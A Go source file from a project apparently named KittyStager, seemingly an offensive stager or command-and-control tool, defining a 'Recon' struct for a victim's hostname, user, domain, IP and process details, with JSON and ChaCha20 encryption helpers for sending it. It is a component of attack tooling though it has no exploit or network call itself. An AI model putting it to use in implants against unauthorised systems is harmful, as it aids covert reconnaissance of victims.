package recon

import (
	"KittyStager/pkg/crypto"
	"encoding/json"
)

type Recon struct {
	Hostname string `json:"hostname"`
	Username string `json:"username"`
	Domain   string `json:"domain"`
	Ip       string `json:"ip"`
	//process
	Pid   int    `json:"pid"`
	PName string `json:"pname"`
	Path  string `json:"path"`
}

func NewRecon(host, user, domain, ip, pName, path string, pid int) *Recon {
	return &Recon{
		Hostname: host,
		Username: user,
		Domain:   domain,
		Ip:       ip,
		Pid:      pid,
		PName:    pName,
		Path:     path,
	}
}

func (recon *Recon) EncryptTask(key []byte) ([]byte, error) {
	c := crypto.NewChaCha20()
	m, err := recon.MarshallTask()
	if err != nil {
		return nil, err
	}
	e, err := c.Encrypt(m, key)
	if err != nil {
		return nil, err
	}
	return e, nil
}

func (recon *Recon) DecryptTask(cypherText []byte, key []byte) error {
	c := crypto.NewChaCha20()
	d, err := c.Decrypt(cypherText, key)
	if err != nil {
		return err
	}
	err = recon.UnmarshallTask(d)
	if err != nil {
		return err
	}
	return nil
}

func (recon *Recon) MarshallTask() ([]byte, error) {
	t, err := json.Marshal(recon)
	if err != nil {
		return nil, err
	}
	return t, nil
}

func (recon *Recon) UnmarshallTask(j []byte) error {
	err := json.Unmarshal(j, &recon)
	if err != nil {
		return err
	}
	return nil
}
